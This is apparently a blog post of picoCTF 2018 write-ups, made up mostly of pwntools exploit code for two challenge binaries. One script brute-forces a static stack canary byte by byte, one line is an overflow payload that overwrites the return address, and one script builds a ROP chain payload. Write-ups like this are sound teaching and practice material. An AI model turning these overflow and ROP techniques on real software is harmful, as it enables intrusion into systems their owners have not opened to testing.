---
layout: post
title: "picoctf 2018 writeups"
date: 2018-10-18 00:42:00 -0500
published: true
---

### buffer_overflow_3

Binary with a handrolled, static canary. So, we're leaking it byte-by-byte.

```
from pwn import *
import sys

for c in range(0,256):
        p = process("/problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf/vuln", cwd="/problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf")
        p.sendline("36")
        p.sendline( "A"*32 + '\x49\x48\x77\x6a' + chr(c) )
        if "Flag" in p.recv(): print "good: %s" % hex(c)
# p.interactive()

# and our one-liner is
# python -c 'from pwn import *; print "100\n" + "A"*32 + "\x49\x48\x77\x6a" + "\xeb\x86\x04\x08" * 5' | ./vuln
```

### rop

Simple ropchain satisfying a few constraints.

```
from pwn import *
path = "/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47"
# p = process(path+"/rop", cwd=path)
payload =  "A"*28 + \
	p32(0x080485cb) + \
	p32(0x080485d8) + \
	p32(0x0804862b) + \
	p32(0xbaaaaaad) + \
	p32(0xdeadbaad)
print payload
```
